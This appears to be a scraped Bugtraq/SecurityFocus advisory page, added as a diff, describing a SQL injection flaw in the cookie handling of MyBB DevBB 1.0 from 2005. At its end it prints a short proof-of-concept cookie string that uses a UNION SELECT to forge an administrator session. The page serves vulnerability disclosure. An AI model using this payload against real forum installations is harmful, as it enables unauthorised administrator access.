@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid16082<p><b><span style="font-size: 18pt;">MyBB Globa.PHP Cookie Data SQL Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/16082/info">info</a><br><a href="http://www.securityfocus.com/bid/16082/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/16082/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/16082/solution">solution</a><br><a href="http://www.securityfocus.com/bid/16082/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				16082
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 29 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Dec 29 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovered by imei &lt;addmimistrator@gmail.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					MyBB DevBB 1.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An exploit is not required.<br/><br/>The following proof of concept example is available:<br/>string expcookie="imei'" //garbrage field that actually is not an uid + an inject sign +" union select '1' as uid," //return no admin union our sniffed admin +" '','','','xxx'as loginkey ,"//we have not any info! so null them; only login key cheked that we fill with xxx +" '','','','',"//null fields befor usergroup +" 4 as usergroup";// ok! our sniffed admin is an admin : D !! for (int i=0;i&lt; 49;i++) expcookie+=",''"; //null all of other fields!expcookie+="-- imei" // remark rest of SQL +"_xxx" ; 
+	
+		<ul>
+</ul>
+</div>
